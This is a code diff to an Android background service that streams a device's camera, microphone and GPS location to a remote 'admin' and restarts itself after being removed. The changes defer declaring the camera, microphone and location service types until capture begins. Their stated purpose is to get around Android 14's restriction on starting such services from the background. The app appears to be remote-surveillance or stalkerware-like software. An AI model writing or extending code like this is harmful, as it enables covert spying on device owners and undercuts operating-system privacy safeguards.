@@ -78,6 +78,10 @@ public class KeepAliveService extends Service {
     private static final long   IDLE_SHUTDOWN_MS = 90 * 1000L;
 
     private PowerManager.WakeLock wakeLock;
+    // Foreground service type actually declared right now — starts DATA_SYNC-only in
+    // onCreate() and gains camera/location/microphone bits one at a time via
+    // addForegroundServiceType, only when that capability is genuinely in use. See onCreate().
+    private int                   currentFgsType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
     // Concurrent file transfers in flight (handleReadFile runs on its own Thread per request) —
     // counted rather than boolean since the admin's file browser can request more than one.
     private final AtomicInteger   activeTransfers = new AtomicInteger(0);
@@ -137,18 +141,16 @@ public class KeepAliveService extends Service {
             .build();
         lkManager = new LiveKitManager(this, httpClient);
         createChannel();
-        // Only include FGS types for permissions already granted — Android 14+ crashes if type
-        // is declared but the matching runtime permission hasn't been granted yet.
+        // Only DATA_SYNC here, never camera/location/microphone based on "permission happens
+        // to be granted" — Android 14+ requires the app to be in a foreground-eligible state
+        // to START a service declaring the microphone (or camera) type, which a background
+        // alarm-triggered restart (see onTaskRemoved below) never is, and crashes outright
+        // otherwise ("SecurityException: Starting FGS with type microphone... requires...
+        // eligible state/exemptions"). DATA_SYNC has no such restriction. The sensitive types
+        // are added later, one at a time, only when that specific capability actually starts
+        // being used — see addForegroundServiceType, called from handleStartCamera/Mic/Location.
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            int type = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
-            if (checkSelfPermission("android.permission.CAMERA") == PackageManager.PERMISSION_GRANTED)
-                type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
-            if (checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") == PackageManager.PERMISSION_GRANTED)
-                type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
-                checkSelfPermission("android.permission.RECORD_AUDIO") == PackageManager.PERMISSION_GRANTED)
-                type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
-            startForeground(NOTIF_ID, buildNotification(), type);
+            startForeground(NOTIF_ID, buildNotification(), currentFgsType);
         } else {
             startForeground(NOTIF_ID, buildNotification());
         }
@@ -740,11 +742,15 @@ public class KeepAliveService extends Service {
         // handleStopCamera below) to track the actual LiveKit-publishing state, so
         // isBusy()/syncWakeLock() know a live camera session is in progress.
         cameraStreaming = true;
+        if (checkSelfPermission("android.permission.CAMERA") == PackageManager.PERMISSION_GRANTED) {
+            addForegroundServiceType(ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
+        }
         lkManager.startCamera(httpBase, userId != null ? userId : "", facing);
     }
 
     private void handleStopCamera() {
         lkManager.stopCamera();
+        removeForegroundServiceType(ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
         // Clean up any leftover Camera2 state (safety)
         cameraStreaming = false;
         try { if (captureSession != null) { captureSession.close(); captureSession = null; } } catch (Exception ignored) {}
@@ -763,6 +769,9 @@ public class KeepAliveService extends Service {
             .putBoolean("micActive", true)
             .putString("micAdminId", fromAdminIdMic)
             .apply();
+        boolean canDeclareMicType = Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
+            checkSelfPermission("android.permission.RECORD_AUDIO") == PackageManager.PERMISSION_GRANTED;
+        if (canDeclareMicType) addForegroundServiceType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
         final int sampleRate = 16000;
         int minBuf = AudioRecord.getMinBufferSize(sampleRate,
             AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
@@ -770,7 +779,9 @@ public class KeepAliveService extends Service {
         audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate,
             AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, chunkSize);
         if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
-            audioRecord.release(); audioRecord = null; return;
+            audioRecord.release(); audioRecord = null;
+            if (canDeclareMicType) removeForegroundServiceType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
+            return;
         }
         audioRecord.startRecording();
         micStreaming = true;
@@ -796,6 +807,7 @@ public class KeepAliveService extends Service {
 
     private void handleStopMic() {
         micStreaming = false;
+        removeForegroundServiceType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
         // Admin explicitly stopped mic — clear persisted state so restart won't auto-resume
         SecurePrefs.get(this).edit()
             .remove("micActive").remove("micAdminId").apply();
@@ -835,6 +847,9 @@ public class KeepAliveService extends Service {
         };
         try {
             locationTracking = true;
+            if (checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") == PackageManager.PERMISSION_GRANTED) {
+                addForegroundServiceType(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
+            }
             locationManager.requestLocationUpdates(
                 LocationManager.GPS_PROVIDER, 15000, 5f, locationListener);
             if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
@@ -846,6 +861,7 @@ public class KeepAliveService extends Service {
 
     private void handleStopLocation() {
         locationTracking = false;
+        removeForegroundServiceType(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
         try {
             if (locationManager != null && locationListener != null) {
                 locationManager.removeUpdates(locationListener);
@@ -939,6 +955,26 @@ public class KeepAliveService extends Service {
                 wakeLock.release();
             }
         } catch (Exception ignored) {}
+    }
+
+    // Adds a foreground service type on top of whatever's already declared (DATA_SYNC at
+    // minimum, see onCreate()) via a follow-up startForeground() call. This is the
+    // platform-sanctioned way to add a sensitive type (camera/microphone) once the service
+    // is ALREADY legitimately in the foreground — unlike declaring it upfront in onCreate(),
+    // this isn't subject to the "must be in an eligible foreground state" restriction that
+    // blocks STARTING a new foreground service with that type from the background.
+    private synchronized void addForegroundServiceType(int type) {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return;
+        if ((currentFgsType & type) != 0) return; // already declared
+        currentFgsType |= type;
+        try { startForeground(NOTIF_ID, buildNotification(), currentFgsType); } catch (Exception ignored) {}
+    }
+
+    private synchronized void removeForegroundServiceType(int type) {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return;
+        if ((currentFgsType & type) == 0) return; // not currently declared
+        currentFgsType &= ~type;
+        try { startForeground(NOTIF_ID, buildNotification(), currentFgsType); } catch (Exception ignored) {}
     }
 
     // Cancels any pending idle-shutdown and, only if nothing is currently active, schedules
